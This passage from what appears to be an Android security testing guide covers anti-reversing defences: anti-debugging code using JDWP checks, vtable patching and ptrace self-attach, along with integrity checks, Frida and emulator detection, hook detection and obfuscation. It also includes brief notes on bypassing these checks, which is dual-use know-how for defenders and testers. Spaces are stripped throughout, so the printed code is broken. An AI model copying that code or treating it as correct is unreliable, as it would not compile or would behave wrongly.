builds Checking for signs of test builds and custom ROMs is also helpful. One way to do this is to check the BUILD tag for test-keys,whichnormallyindicateacustomAndroidimage. ChecktheBUILDtagasfollows: private boolean isTestKeyBuild() { Stringstr =Build.TAGS; if((str!=null)&& (str.contains("test-keys"))); for(inti=1;;i=0) return i; } Missing Google Over-The-Air (OTA) certificates is another sign of a custom ROM: on stock Android builds, OTA updates Google’spubliccertificates. Anti-Debugging Debuggingisahighlyeffectivewaytoanalyzeruntimeappbehavior. Itallowsthereverseengineertostepthroughthe code,stopappexecutionatarbitrarypoints,inspectthestateofvariables,readandmodifymemory,andalotmore. Anti-debugging features can be preventive or reactive. As the name implies, preventive anti-debugging prevents the debuggerfromattachinginthefirstplace; reactiveanti-debugginginvolvesdetectingdebuggersandreactingtothem in some way (e.g., terminating the app or triggering hidden behavior). The “more-is-better” rule applies: to maximize effectiveness,defenderscombinemultiplemethodsofpreventionanddetectionthatoperateondifferentAPIlayersand arewelldistributedthroughouttheapp. As mentioned in the “Reverse Engineering and Tampering” chapter, we have to deal with two debugging protocols on Android: we can debug on the Java level with JDWP or on the native layer via a ptrace-based debugger. A good anti- debuggingschemeshoulddefendagainstbothtypesofdebugging. 304\nJDWP Anti-Debugging Inthechapter“ReverseEngineeringandTampering”,wetalkedaboutJDWP,theprotocolusedforcommunicationbetween thedebuggerandtheJavaVirtualMachine. Weshowedthatitiseasytoenabledebuggingforanyappbypatchingits manifestfile,andchangingthero.debuggablesystempropertywhichenablesdebuggingforallapps. Let’slookatafew thingsdevelopersdotodetectanddisableJDWPdebuggers. Checking the Debuggable Flag in ApplicationInfo Wehavealreadyencounteredtheandroid:debuggableattribute. ThisflagintheAndroidManifestdetermineswhether theJDWPthreadisstartedfortheapp. Itsvaluecanbedeterminedprogrammatically, viatheapp’sApplicationInfo object. Iftheflagisset,themanifesthasbeentamperedwithandallowsdebugging. public static boolean isDebuggable(Contextcontext){ return ((context.getApplicationContext().getApplicationInfo().flags & ApplicationInfo.FLAG_DEBUGGABLE)!=0); } isDebuggerConnected While this might be pretty obvious to circumvent for a reverse engineer, you can use isDebuggerConnected from the android.os.Debugclasstodeterminewhetheradebuggerisconnected. public static boolean detectDebugger(){ return Debug.isDebuggerConnected(); } ThesameAPIcanbecalledvianativecodebyaccessingtheDvmGlobalsglobalstructure. JNIEXPORTjbooleanJNICALLJava_com_test_debugging_DebuggerConnectedJNI(JNIenv *env,jobjectobj){ if(gDvm.debuggerConnected ||gDvm.debuggerActive) return JNI_TRUE; return JNI_FALSE; } Timer Checks Debug.threadCpuTimeNanos indicates the amount of time that the current thread has been executing code. Because debuggingslowsdownprocessexecution,youcanusethedifferenceinexecutiontimetoguesswhetheradebuggeris attached. static boolean detect_threadCpuTimeNanos(){ long start =Debug.threadCpuTimeNanos(); for(inti=0;i<1000000;++i) continue; long stop =Debug.threadCpuTimeNanos(); if(stop -start <10000000){ return false; } else { return true; } } Messing with JDWP-Related Data Structures InDalvik,theglobalvirtualmachinestateisaccessibleviatheDvmGlobalsstructure. TheglobalvariablegDvmholdsa pointertothisstructure. DvmGlobalscontainsvariousvariablesandpointersthatareimportantforJDWPdebuggingand canbetamperedwith. 305\nstruct DvmGlobals { /* *Someoptionsthatcouldbeworthtamperingwith:) */ bool jdwpAllowed; //debuggingallowedforthisprocess? bool jdwpConfigured; //hasdebugginginfobeenprovided? JdwpTransportTypejdwpTransport; bool jdwpServer; char* jdwpHost; int jdwpPort; bool jdwpSuspend; Thread* threadList; bool nativeDebuggerActive; bool debuggerConnected; /*debuggerorDDMSisconnected*/ bool debuggerActive; /*debuggerismakingrequests*/ JdwpState* jdwpState; }; Forexample,settingthegDvm.methDalvikDdmcServer_dispatchfunctionpointertoNULLcrashestheJDWPthread: JNIEXPORTjbooleanJNICALLJava_poc_c_crashOnInit (JNIEnv*env,jobject ){ gDvm.methDalvikDdmcServer_dispatch =NULL; } YoucandisabledebuggingbyusingsimilartechniquesinARTeventhoughthegDvmvariableisnotavailable. TheART runtime exports some of the vtables of JDWP-related classes as global symbols (in C++, vtables are tables that hold pointerstoclassmethods). ThisincludesthevtablesoftheclassesJdwpSocketStateandJdwpAdbState,whichhandle JDWPconnectionsvianetworksocketsandADB,respectively. Youcanmanipulatethebehaviorofthedebuggingruntime byoverwritingthemethodpointersintheassociatedvtables(archived). OnewaytooverwritethemethodpointersistooverwritetheaddressofthefunctionjdwpAdbState::ProcessIncoming withtheaddressofJdwpAdbState::Shutdown. Thiswillcausethedebuggertodisconnectimmediately. #include <jni.h> #include <string> #include <android/log.h> #include <dlfcn.h> #include <sys/mman.h> #include <jdwp/jdwp.h> #definelog(FMT,...) __android_log_print(ANDROID_LOG_VERBOSE,"JDWPFun",FMT,##__VA_ARGS__) //Vtablestructure.Justtomakemessingaroundwithitmoreintuitive struct VT_JdwpAdbState { unsigned long x; unsigned long y; void *JdwpSocketState_destructor; void *_JdwpSocketState_destructor; void *Accept; void *showmanyc; void *ShutDown; void *ProcessIncoming; }; extern "C" JNIEXPORT void JNICALLJava_sg_vantagepoint_jdwptest_MainActivity_JDWPfun( JNIEnv *env, jobject /*this*/){ void*lib=dlopen("libart.so",RTLD_NOW); if(lib==NULL){ log("Errorloadinglibart.so"); dlerror(); }else{ struct VT_JdwpAdbState *vtable =(struct VT_JdwpAdbState *)dlsym(lib,"_ZTVN3art4JDWP12JdwpAdbStateE"); if(vtable ==0){ log("Couldn'tresolvesymbol'_ZTVN3art4JDWP12JdwpAdbStateE'.\n"); }else { log("VtableforJdwpAdbStateat: %08x\n",vtable); //Letthefunbegin! unsigned long pagesize =sysconf(_SC_PAGE_SIZE); 306\nunsigned long page =(unsigned long)vtable & ~(pagesize-1); mprotect((void *)page,pagesize,PROT_READ |PROT_WRITE); vtable->ProcessIncoming =vtable->ShutDown; //Resetpermissions&flushcache mprotect((void *)page,pagesize,PROT_READ); } } } Traditional Anti-Debugging OnLinux,theptracesystemcallisusedtoobserveandcontroltheexecutionofaprocess(thetracee)andtoexamineand changethatprocess’memoryandregisters. ptraceistheprimarywaytoimplementsystemcalltracingandbreakpoint debugging in native code. Most JDWP anti-debugging tricks (which may be safe for timer-based checks) won’t catch classicaldebuggersbasedonptraceandtherefore,manyAndroidanti-debuggingtricksincludeptrace,oftenexploiting thefactthatonlyonedebuggeratatimecanattachtoaprocess. Checking TracerPid When you debug an app and set a breakpoint on native code, Android Studio will copy the needed files to the target deviceandstartthelldb-serverwhichwilluseptracetoattachtotheprocess. Fromthismomenton,ifyouinspectthe statusfileofthedebuggedprocess(/proc/<pid>/statusor/proc/self/status),youwillseethatthe“TracerPid”field hasavaluedifferentfrom0,whichisasignofdebugging. Remember that this only applies to native code. If you’re debugging a Java/Kotlin-only app the value of the “TracerPid”fieldshouldbe0. ThistechniqueisusuallyappliedwithintheJNInativelibrariesinC,asshowninGoogle’sgperftools(GooglePerformance Tools))HeapCheckerimplementationoftheIsDebuggerAttachedmethod. However,ifyouprefertoincludethischeckas partofyourJava/KotlincodeyoucanrefertothisJavaimplementationofthehasTracerPidmethodfromTimStrazzere’s Anti-Emulatorproject. Whentryingtoimplementsuchamethodyourself,youcanmanuallycheckthevalueofTracerPidwithADB.Thefollow- inglistingusesGoogle’sNDKsampleapphello-jni(com.example.hellojni)toperformthecheckafterattachingAndroid Studio’sdebugger: $adbshellps -A|grep com.example.hellojni u0_a271 11657 5734302108 50600ptrace_stop 0tcom.example.hellojni $adbshellcat/proc/11657/status |grep -e"^TracerPid:" |sed"s/^TracerPid:\t//" TracerPid: 11839 $adbshellps -A|grep 11839 u0_a271 1183911837 14024 4548poll_schedule_timeout0Slldb-server Youcanseehowthestatusfileofcom.example.hellojni(PID=11657)containsaTracerPIDof11839,whichwecanidentify asthelldb-serverprocess. Using Fork and ptrace Youcanpreventdebuggingofaprocessbyforkingachildprocessandattachingittotheparentasadebuggerviacode similartothefollowingsimpleexamplecode: void fork_and_attach() { intpid=fork(); if(pid==0) { intppid =getppid(); if(ptrace(PTRACE_ATTACH,ppid,NULL,NULL)==0) { waitpid(ppid,NULL,0); 307\n/*Continuetheparentprocess*/ ptrace(PTRACE_CONT,NULL,NULL); } } } Withthechildattached,furtherattemptstoattachtotheparentwillfail. Wecanverifythisbycompilingthecodeintoa JNIfunctionandpackingitintoanappwerunonthedevice. root@android:/ #ps|grep-ianti u0_a151 18190201 153584454908ffffffffb6e0f124Ssg.vantagepoint.antidebug u0_a151 1822418190149518035824c019a3acb6e0ee5cSsg.vantagepoint.antidebug Attemptingtoattachtotheparentprocesswithgdbserverfailswithanerror: root@android:/ #./gdbserver--attachlocalhost:1234518190 warning:process18190isalreadytracedbyprocess18224 Cannotattachtolwp18190:Operationnotpermitted (1) Exiting Youcaneasilybypassthisfailure,however,bykillingthechildand“freeing”theparentfrombeingtraced. You’lltherefore usually find more elaborate schemes, involving multiple processes and threads as well as some form of monitoring to impedetampering. Commonmethodsinclude • forkingmultipleprocessesthattraceoneanother, • keepingtrackofrunningprocessestomakesurethechildrenstayalive, • monitoringvaluesinthe/procfilesystem,suchasTracerPIDin/proc/pid/status. Let’slookatasimpleimprovementforthemethodabove. Aftertheinitialfork,welaunchintheparentanextrathread that continually monitors the child’s status. Depending on whether the app has been built in debug or release mode (which is indicated by the android:debuggable flag in the manifest), the child process should do one of the following things: • In release mode: The call to ptrace fails and the child crashes immediately with a segmentation fault (exit code 11). • In debug mode: The call to ptrace works and the child should run indefinitely. Consequently, a call to wait- pid(child_pid)shouldneverreturn. Ifitdoes,somethingisfishyandwewouldkillthewholeprocessgroup. ThefollowingisthecompletecodeforimplementingthisimprovementwithaJNIfunction: #include <jni.h> #include <unistd.h> #include <sys/ptrace.h> #include <sys/wait.h> #include <pthread.h> static intchild_pid; void *monitor_pid(){ intstatus; waitpid(child_pid,&status,0); /*Childstatusshouldneverchange.*/ _exit(0);//Commitseppuku } void anti_debug(){ child_pid =fork(); if(child_pid ==0) { intppid =getppid(); intstatus; if(ptrace(PTRACE_ATTACH,ppid,NULL,NULL)==0) { waitpid(ppid,&status,0); ptrace(PTRACE_CONT,ppid,NULL,NULL); 308\nwhile (waitpid(ppid,&status,0)){ if(WIFSTOPPED(status)){ ptrace(PTRACE_CONT,ppid,NULL,NULL); }else { //Processhasexited _exit(0); } } } }else { pthread_tt; /*Startthemonitoringthread*/ pthread_create(&t,NULL,monitor_pid,(void *)NULL); } } JNIEXPORT void JNICALL Java_sg_vantagepoint_antidebug_MainActivity_antidebug(JNIEnv *env,jobjectinstance){ anti_debug(); } Again,wepackthisintoanAndroidapptoseeifitworks. Justasbefore,twoprocessesshowupwhenweruntheapp’s debugbuild. root@android:/ #ps|grep-Ianti-debug u0_a152 20267201 155250856796ffffffffb6e0f124Ssg.vantagepoint.anti-debug u0_a152 2030120267149519233980c019a3acb6e0ee5cSsg.vantagepoint.anti-debug However,ifweterminatethechildprocessatthispoint,theparentexitsaswell: root@android:/ #kill-920301 130|root@hammerhead:/ #cd/data/local/tmp root@android:/ #./gdbserver--attachlocalhost:1234520267 gdbserver:unabletoopen/procfile '/proc/20267/status' Cannotattachtolwp20267:Nosuchfileordirectory (2) Exiting Tobypassthis,wemustmodifytheapp’sbehaviorslightly(theeasiestwaystodosoarepatchingthecallto_exitwith NOPsandhookingthefunction_exitinlibc.so). Atthispoint,wehaveenteredtheproverbial“armsrace”: implement- ingmoreintricateformsofthisdefenseaswellasbypassingitarealwayspossible. File Integrity Checks Therearetwotopicsrelatedtofileintegrity: 1. Codeintegritychecks: Inthe“TamperingandReverseEngineeringonAndroid”chapter,wediscussedAndroid’sAPK codesignaturecheck. Wealsosawthatdeterminedreverseengineerscaneasilybypassthischeckbyre-packaging andre-signinganapp. Tomakethisbypassingprocessmoreinvolved,aprotectionschemecanbeaugmentedwith CRCchecksontheappbytecode,nativelibraries,andimportantdatafiles. Thesecheckscanbeimplementedon boththeJavaandthenativelayer. Theideaistohaveadditionalcontrolsinplacesothattheapponlyrunscorrectly initsunmodifiedstate,evenifthecodesignatureisvalid. 2. Thefilestorageintegritychecks: TheintegrityoffilesthattheapplicationstoresontheSDcardorpublicstorage andtheintegrityofkey-valuepairsthatarestoredinSharedPreferencesshouldbeprotected. Sample Implementation - Application Source Code Integritychecksoftencalculateachecksumorhashoverselectedfiles. Commonlyprotectedfilesinclude • AndroidManifest.xml, • classfiles*.dex, • nativelibraries(*.so). 309\nThefollowingsampleimplementationfromtheAndroidCrackingblogcalculatesaCRCoverclasses.dexandcompares ittotheexpectedvalue. private void crcTest()throws IOException { boolean modified =false; //requireddexcrcvaluestoredasatextstring. //itcouldbeanyinvisiblelayoutelement long dexCrc =Long.parseLong(Main.MyContext.getString(R.string.dex_crc)); ZipFilezf =newZipFile(Main.MyContext.getPackageCodePath()); ZipEntryze =zf.getEntry("classes.dex"); if(ze.getCrc()!=dexCrc ){ //dexhasbeenmodified modified =true; } else { //dexnottamperedwith modified =false; } } Sample Implementation - Storage When providing integrity on the storage itself, you can either create an HMAC over a given key-value pair (as for the AndroidSharedPreferences)orcreateanHMACoveracompletefilethat’sprovidedbythefilesystem. WhenusinganHMAC,youcanuseabouncycastleimplementationortheAndroidKeyStoretoHMACthegivencontent. CompletethefollowingprocedurewhengeneratinganHMACwithBouncyCastle: 1. MakesureBouncyCastleorSpongyCastleisregisteredasasecurityprovider. 2. InitializetheHMACwithakey(whichcanbestoredinakeystore). 3. GetthebytearrayofthecontentthatneedsanHMAC. 4. CalldoFinalontheHMACwiththebytecode. 5. AppendtheHMACtothebytearrayobtainedinstep3. 6. Storetheresultofstep5. CompletethefollowingprocedurewhenverifyingtheHMACwithBouncyCastle: 1. MakesurethatBouncyCastleorSpongyCastleisregisteredasasecurityprovider. 2. ExtractthemessageandtheHMAC-bytesasseparatearrays. 3. Repeatsteps1-4oftheprocedureforgeneratinganHMAC. 4. ComparetheextractedHMAC-bytestotheresultofstep3. WhengeneratingtheHMACbasedontheAndroidKeystore, thenitisbesttoonlydothisforAndroid6.0(APIlevel23) andhigher. ThefollowingisaconvenientHMACimplementationwithoutAndroidKeyStore: public enum HMACWrapper { HMAC_512("HMac-SHA512"),//pleasenotethatthisisthespecfortheBCprovider HMAC_256("HMac-SHA256"); private final Stringalgorithm; private HMACWrapper(final Stringalgorithm){ this.algorithm =algorithm; } public MaccreateHMAC(final SecretKeykey){ try{ Mace =Mac.getInstance(this.algorithm,"BC"); SecretKeySpecsecret =newSecretKeySpec(key.getKey().getEncoded(), this.algorithm); e.init(secret); return e; }catch (NoSuchProviderException |InvalidKeyException |NoSuchAlgorithmExceptione){ //handlethem } } public byte[]hmac(byte[]message,SecretKeykey){ Macmac =this.createHMAC(key); return mac.doFinal(message); } public boolean verify(byte[]messageWithHMAC,SecretKeykey){ 310\nMacmac =this.createHMAC(key); byte[]checksum =extractChecksum(messageWithHMAC,mac.getMacLength()); byte[]message =extractMessage(messageWithHMAC,mac.getMacLength()); byte[]calculatedChecksum =this.hmac(message,key); intdiff =checksum.length ^calculatedChecksum.length; for(inti=0;i<checksum.length && i<calculatedChecksum.length;++i){ diff |=checksum[i]^calculatedChecksum[i]; } return diff ==0; } public byte[]extractMessage(byte[]messageWithHMAC){ Machmac =this.createHMAC(SecretKey.newKey()); return extractMessage(messageWithHMAC,hmac.getMacLength()); } private static byte[]extractMessage(byte[]body,intchecksumLength){ if(body.length >=checksumLength){ byte[]message =newbyte[body.length -checksumLength]; System.arraycopy(body,0,message,0,message.length); return message; }else { return newbyte[0]; } } private static byte[]extractChecksum(byte[]body,intchecksumLength){ if(body.length >=checksumLength){ byte[]checksum =newbyte[checksumLength]; System.arraycopy(body,body.length -checksumLength,checksum,0, checksumLength); return checksum; }else { return newbyte[0]; } } static { Security.addProvider(newBouncyCastleProvider()); } } Anotherwaytoprovideintegrityistosignthebytearrayyouobtainedandaddthesignaturetotheoriginalbytearray. Detection of Reverse Engineering Tools Thepresenceoftools, frameworksandappscommonlyusedbyreverseengineersmayindicateanattempttoreverse engineertheapp. Someofthesetoolscanonlyrunonarooteddevice,whileothersforcetheappintodebuggingmode ordependonstartingabackgroundserviceonthemobilephone. Therefore, therearedifferentwaysthatanappmay implementtodetectareverseengineeringattackandreacttoit,e.g.byterminatingitself. Youcandetectpopularreverseengineeringtoolsthathavebeeninstalledinanunmodifiedformbylookingforassociated applicationpackages,files,processes,orothertool-specificmodificationsandartifacts. Inthefollowingexamples,we’ll discussdifferentwaystodetecttheFridainstrumentationframework,whichisusedextensivelyinthisguide. Othertools, such as Substrate and Xposed, can be detected similarly. Note that DBI/injection/hooking tools can often be detected implicitly,throughruntimeintegritychecks,whicharediscussedbelow. Forinstance,initsdefaultconfigurationonarooteddevice,Fridarunsonthedeviceasfrida-server. Whenyouexplicitly attach to a target app (e.g. via frida-trace or the Frida REPL), Frida injects a frida-agent into the memory of the app. Therefore, youmayexpecttofinditthereafterattachingtotheapp(andnotbefore). Ifyoucheck/proc/<pid>/maps you’llfindthefrida-agentasfrida-agent-64.so: bullhead:/ #cat/proc/18370/maps|grep-ifrida 71b6bd6000-71b7d62000r-xp /data/local/tmp/re.frida.server/frida-agent-64.so 71b7d7f000-71b7e06000r--p /data/local/tmp/re.frida.server/frida-agent-64.so 71b7e06000-71b7e28000rw-p /data/local/tmp/re.frida.server/frida-agent-64.so Theothermethod(whichalsoworksfornon-rooteddevices)consistsofembeddingafrida-gadgetintotheAPKandforcing theapptoloaditasoneofitsnativelibraries. Ifyouinspecttheappmemorymapsafterstartingtheapp(noneedto attachexplicitlytoit)you’llfindtheembeddedfrida-gadgetaslibfrida-gadget.so. 311\nbullhead:/ #cat/proc/18370/maps|grep-ifrida 71b865a000-71b97f1000r-xp /data/app/sg.vp.owasp_mobile.omtg_android-.../lib/arm64/libfrida-gadget.so 71b9802000-71b988a000r--p /data/app/sg.vp.owasp_mobile.omtg_android-.../lib/arm64/libfrida-gadget.so 71b988a000-71b98ac000rw-p /data/app/sg.vp.owasp_mobile.omtg_android-.../lib/arm64/libfrida-gadget.so LookingatthesetwotracesthatFridaleftsbehind,youmightalreadyimaginethatdetectingthosewouldbeatrivialtask. Andactually,sotrivialwillbebypassingthatdetection. Butthingscangetmuchmorecomplicated. Thefollowingtable shortlypresentsasetofsometypicalFridadetectionmethodsandashortdiscussionontheireffectiveness. Someofthefollowingdetectionmethodsarepresentedinthearticle“TheJiu-JitsuofDetectingFrida”byBerdhard Mueller(archived). Pleaserefertoitformoredetailsandforexamplecodesnippets. Method Description Discussion CheckingtheAppSignature Inordertoembedthefrida-gadget Thisisunfortunatelytootrivialto withintheAPK,itwouldneedtobe bypass,e.g.bypatchingtheAPKor repackagedandresigned. Youcould performingsystemcallhooking. checkthesignatureoftheAPKwhen theappisstarting (e.g.GET_SIGNING_CERTIFICATES sinceAPIlevel28)andcompareitto theoneyoupinnedinyourAPK. CheckTheEnvironmentFor Artifactscanbepackagefiles, SinceAndroid7.0(APIlevel24), RelatedArtifacts binaries,libraries,processes,and inspectingtherunning temporaryfiles. ForFrida,thiscould services/processeswon’tshowyou bethefrida-serverrunninginthe daemonslikethefrida-serverasitis target(rooted)system(thedaemon notbeingstartedbytheappitself. responsibleforexposingFridaover Evenifitwouldbepossible, TCP).Inspecttherunningservices bypassingthiswouldbeaseasyjust (getRunningServices)andprocesses renamingthecorrespondingFrida (ps)searchingforonewhosenameis artifact(frida-server/frida- “frida-server”. Youcouldalsowalk gadget/frida-agent). throughthelistofloadedlibrariesand checkforsuspiciousones(e.g.those including“frida”intheirnames). CheckingForOpenTCPPorts Thefrida-serverprocessbindstoTCP Thismethoddetectsfrida-serverinits port27042bydefault. Checkwhether defaultmode,butthelisteningport thisportisopenisanothermethodof canbechangedviaacommandline detectingthedaemon. argument,sobypassingthisisalittle tootrivial. CheckingForPortsResponding frida-serverusestheD-Bus Thisisafairlyrobustmethodof ToD-BusAuth protocoltocommunicate,soyoucan detectingfrida-server,butFrida expectittorespondtoD-BusAUTH. offersalternativemodesofoperation SendaD-BusAUTHmessagetoevery thatdon’trequirefrida-server. openportandcheckforananswer, hopingthatfrida-serverwillreveal itself. 312\nMethod Description Discussion ScanningProcessMemoryfor Scanthememoryforartifactsfound Thismethodisabitmoreeffective, KnownArtifacts inFrida’slibraries,e.g.thestring anditisdifficulttobypasswithFrida “LIBFRIDA”presentinallversionsof only,especiallyifsomeobfuscation frida-gadgetandfrida-agent. For hasbeenaddedandifmultiple example,use artifactsarebeingscanned. However, Runtime.getRuntime().execand thechosenartifactsmightbepatched iteratethroughthememory intheFridabinaries. Findthesource mappingslistedin/proc/self/maps codeonBerdhardMueller’sGitHub. or/proc/<pid>/maps(dependingon theAndroidversion)searchingforthe string. Pleaserememberthatthistableisfarfromexhaustive. Wecouldstarttalkingaboutnamedpipes(usedbyfrida-server forexternalcommunication),detectingtrampolines(indirectjumpvectorsinsertedattheprologueoffunctions),which wouldhelpdetectingSubstrateorFrida’sInterceptorbut,forexample,won’tbeeffectiveagainstFrida’sStalker;andmany other,moreorless,effectivedetectionmethods. Eachofthemwilldependonwhetheryou’reusingarooteddevice,the specific version of the rooting method and/or the version of the tool itself. Further, the app can try to make it harder to detect the implemented protection mechanisms by using various obfuscation techniques. At the end, this is part of thecatandmousegameofprotectingdatabeingprocessedonanuntrustedenvironment(anapprunningintheuser device). Itisimportanttonotethatthesecontrolsareonlyincreasingthecomplexityofthereverseengineeringprocess. If used, the best approachis to combine the controlscleverly instead of using them individually. However, none of themcanassurea100%effectiveness,asthereverseengineerwillalwayshavefullaccesstothedeviceandwill thereforealwayswin! Youalsohavetoconsiderthatintegratingsomeofthecontrolsintoyourappmightincrease thecomplexityofyourappandevenhaveanimpactonitsperformance. Emulator Detection In the context of anti-reversing, the goal of emulator detection is to increase the difficulty of running the app on an emulateddevice,whichimpedessometoolsandtechniquesreverseengineersliketouse. Thisincreaseddifficultyforces thereverseengineertodefeattheemulatorchecksorutilizethephysicaldevice,therebybarringtheaccessrequiredfor large-scaledeviceanalysis. There are several indicators that the device in question is being emulated. Although all these API calls can be hooked, theseindicatorsprovideamodestfirstlineofdefense. Thefirstsetofindicatorsareinthefilebuild.prop. APIMethod Value Meaning Build.ABI armeabi possiblyemulator BUILD.ABI2 unknown possiblyemulator Build.BOARD unknown emulator Build.Brand generic emulator Build.DEVICE generic emulator Build.FINGERPRINT generic emulator Build.Hardware goldfish emulator Build.Host android-test possiblyemulator Build.ID FRF91 emulator Build.MANUFACTURER unknown emulator Build.MODEL sdk emulator Build.PRODUCT sdk emulator Build.RADIO unknown possiblyemulator Build.SERIAL null emulator Build.USER android-build emulator Youcaneditthefilebuild.proponarootedAndroiddeviceormodifyitwhilecompilingAOSPfromsource. Bothtechniques willallowyoutobypassthestaticstringchecksabove. ThenextsetofstaticindicatorsutilizetheTelephonymanager. AllAndroidemulatorshavefixedvaluesthatthisAPIcan query. 313\nAPI Value Meaning TelephonyManager.getDeviceId() 0's emulator TelephonyManager.getLine1Number() 155552155 emulator TelephonyManager.getNetworkCountryIso() us possiblyemulator TelephonyManager.getNetworkType() 3 possiblyemulator TelephonyManager.getNetworkOperator().substring(0,3) 310 possiblyemulator TelephonyManager.getNetworkOperator().substring(3) 260 possiblyemulator TelephonyManager.getPhoneType() 1 possiblyemulator TelephonyManager.getSimCountryIso() us possiblyemulator TelephonyManager.getSimSerialNumber() 89014103211118510720 emulator TelephonyManager.getSubscriberId() 310260000000000 emulator TelephonyManager.getVoiceMailNumber() 15552175049 emulator Keepinmindthatahookingframework,suchasXposedorFrida,canhookthisAPItoprovidefalsedata. Runtime Integrity Verification Controlsinthiscategoryverifytheintegrityoftheapp’smemoryspacetodefendtheappagainstmemorypatchesapplied duringruntime. Suchpatchesincludeunwantedchangestobinarycode,bytecode,functionpointertables,andimportant datastructures,aswellasroguecodeloadedintoprocessmemory. Integritycanbeverifiedby: 1. comparingthecontentsofmemoryorachecksumoverthecontentstogoodvalues, 2. searchingmemoryforthesignaturesofunwantedmodifications. There’ssomeoverlapwiththecategory“detectingreverseengineeringtoolsandframeworks”,and,infact,wedemon- stratedthesignature-basedapproachinthatchapterwhenweshowedhowtosearchprocessmemoryforFrida-related strings. Belowareafewmoreexamplesofvariouskindsofintegritymonitoring. Detecting Tampering with the Java Runtime Thisdetectioncodeisfromthedead&&endblog. try{ throw newException(); } catch(Exceptione){ intzygoteInitCallCount =0; for(StackTraceElementstackTraceElement :e.getStackTrace()){ if(stackTraceElement.getClassName().equals("com.android.internal.os.ZygoteInit")){ zygoteInitCallCount++; if(zygoteInitCallCount ==2){ Log.wtf("HookDetection","Substrateisactiveonthedevice."); } } if(stackTraceElement.getClassName().equals("com.saurik.substrate.MS$2")&& stackTraceElement.getMethodName().equals("invoked")){ Log.wtf("HookDetection","AmethodonthestacktracehasbeenhookedusingSubstrate."); } if(stackTraceElement.getClassName().equals("de.robv.android.xposed.XposedBridge")&& stackTraceElement.getMethodName().equals("main")){ Log.wtf("HookDetection","Xposedisactiveonthedevice."); } if(stackTraceElement.getClassName().equals("de.robv.android.xposed.XposedBridge")&& stackTraceElement.getMethodName().equals("handleHookedMethod")){ Log.wtf("HookDetection","AmethodonthestacktracehasbeenhookedusingXposed."); } } } Detecting Native Hooks By using ELF binaries, native function hooks can be installed by overwriting function pointers in memory (e.g., Global Offset Table or PLT hooking) or patching parts of the function code itself (inline hooking). Checking the integrity of the respectivememoryregionsisonewaytodetectthiskindofhook. TheGlobalOffsetTable(GOT)isusedtoresolvelibraryfunctions. Duringruntime,thedynamiclinkerpatchesthistable withtheabsoluteaddressesofglobalsymbols. GOThooksoverwritethestoredfunctionaddressesandredirectlegitimate functioncallstoadversary-controlledcode. Thistypeofhookcanbedetectedbyenumeratingtheprocessmemorymap andverifyingthateachGOTentrypointstoalegitimatelyloadedlibrary. 314\nIncontrasttoGNUld,whichresolvessymboladdressesonlyaftertheyareneededforthefirsttime(lazybinding),the AndroidlinkerresolvesallexternalfunctionsandwritestherespectiveGOTentriesimmediatelyafteralibraryisloaded (immediatebinding). YoucanthereforeexpectallGOTentriestopointtovalidmemorylocationsinthecodesectionsof theirrespectivelibrariesduringruntime. GOThookdetectionmethodsusuallywalktheGOTandverifythis. Inline hooks work by overwriting a few instructions at the beginning or end of the function code. During runtime, this so-called trampoline redirects execution to the injected code. You can detect inline hooks by inspecting the prologues andepiloguesoflibraryfunctionsforsuspectinstructions,suchasfarjumpstolocationsoutsidethelibrary. Obfuscation Thechapter“MobileAppTamperingandReverseEngineering”introducesseveralwell-knownobfuscationtechniquesthat canbeusedinmobileappsingeneral. Androidappscanimplementsomeofthoseobfuscationtechniquesusingdifferenttooling. Forexample,ProGuardoffers an easy way to shrink and obfuscate code and to strip unneeded debugging information from the bytecode of Android Javaapps. Itreplacesidentifiers,suchasclassnames,methodnames,andvariablenames,withmeaninglesscharacter strings. Thisisatypeoflayoutobfuscation,whichdoesn’timpacttheprogram’sperformance. DecompilingJavaclassesistrivial,thereforeitisrecommendedtoalwaysapplyingsomebasicobfuscationtothe productionbytecode. LearnmoreaboutAndroidobfuscationtechniques: • “SecurityHardeningofAndroidNativeCode”byGautamArvind • “APKiD:FastIdentificationofAppShieldingProducts”byEduardoNovella • “ChallengesofNativeAndroidApplications: ObfuscationandVulnerabilities”byPierreGraux Using ProGuard Developersusethebuild.gradlefiletoenableobfuscation. Intheexamplebelow,youcanseethatminifyEnabledand proguardFilesareset. Creatingexceptionstoprotectsomeclassesfromobfuscation(with-keepclassmembersand- keepclass)iscommon. Therefore,auditingtheProGuardconfigurationfiletoseewhatclassesareexemptedisimportant. ThegetDefaultProguardFile('proguard-android.txt')methodgetsthedefaultProGuardsettingsfromthe<Android SDK>/tools/proguard/folder. Furtherinformationonhowtoshrink,obfuscate,andoptimizeyourappcanbefoundintheAndroiddeveloperdocumen- tation. WhenyoubuildyourprojectusingAndroidStudio3.4orAndroidGradleplugin3.4.0orhigher,thepluginnolonger usesProGuardtoperformcompile-timecodeoptimization. Instead,thepluginusestheR8compiler. R8workswith allofyourexistingProGuardrulesfiles,soupdatingtheAndroidGradleplugintouseR8shouldnotrequireyouto changeyourexistingrules. R8isthenewcodeshrinkerfromGoogleandwasintroducedinAndroidStudio3.3beta. Bydefault,R8removesattributes thatareusefulfordebugging,includinglinenumbers,sourcefilenames,andvariablenames. R8isafreeJavaclassfile shrinker,optimizer,obfuscator,andpre-verifierandisfasterthanProGuard,seealsoanAndroidDeveloperblogpostfor further details. It is shipped with Android’s SDK tools. To activate shrinking for the release build, add the following to build.gradle: android{ buildTypes{ release{ //Enablescodeshrinking,obfuscation,andoptimizationforonly //yourproject'sreleasebuildtype. minifyEnabledtrue //IncludesthedefaultProGuardrulesfilesthatarepackagedwith //theAndroidGradleplugin.Tolearnmore,gotothesectionabout //R8configurationfiles. proguardFilesgetDefaultProguardFile( 'proguard-android-optimize.txt'), 'proguard-rules.pro' } 315\n} ... } Thefileproguard-rules.proiswhereyoudefinecustomProGuardrules. Withtheflag-keepyoucankeepcertaincode thatisnotbeingremovedbyR8,whichmightotherwiseproduceerrors. ForexampletokeepcommonAndroidclasses, asinoursampleconfigurationproguard-rules.profile: ... -keeppublicclass*extendsandroid.app.Activity -keeppublicclass*extendsandroid.app.Application -keeppublicclass*extendsandroid.app.Service ... Youcandefinethismoregranularlyonspecificclassesorlibrariesinyourprojectwiththefollowingsyntax: -keeppublicclassMyClass Obfuscationoftencarriesacostinruntimeperformance,thereforeitisusuallyonlyappliedtocertainveryspecificparts ofthecode,typicallythosedealingwithsecurityandruntimeprotection. Device Binding ThegoalofdevicebindingistoimpedeanattackerwhotriestobothcopyanappanditsstatefromdeviceAtodeviceB andcontinueexecutingtheappondeviceB.AfterdeviceAhasbeendeterminedtrustworthy,itmayhavemoreprivileges 